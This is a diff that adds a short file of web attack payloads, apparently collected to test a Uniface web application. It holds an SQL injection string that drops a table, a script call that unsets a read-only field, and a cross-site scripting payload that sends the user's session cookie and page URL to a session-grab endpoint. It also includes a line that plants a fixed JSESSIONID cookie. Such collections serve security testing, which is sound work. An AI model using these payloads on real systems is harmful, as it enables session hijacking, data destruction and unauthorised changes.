@@ -1,0 +1,13 @@
+Robert'); DROP TABLE students;--
+
+
+uniface.getEntity("DUMMY.DUMMY").getOccurrence(0).getField("READ_ONLY_1").setProperty("html:readonly", false);
+
+
+<script>console.log("Hello!");</script>
+
+<script>
+document.write('<img src=\'http://localhost:8080/unifaceweb/wrd/SEC_SESSION_GRAB?s=' + escape(document.cookie) + '&u=' + escape(document.location.href) + '\' />');
+</script>
+
+document.cookie = 'JSESSIONID=AD86CA8E2A5E48454CEFFCEB59EFBE8C; expires=Session; path=/unifaceweb/'
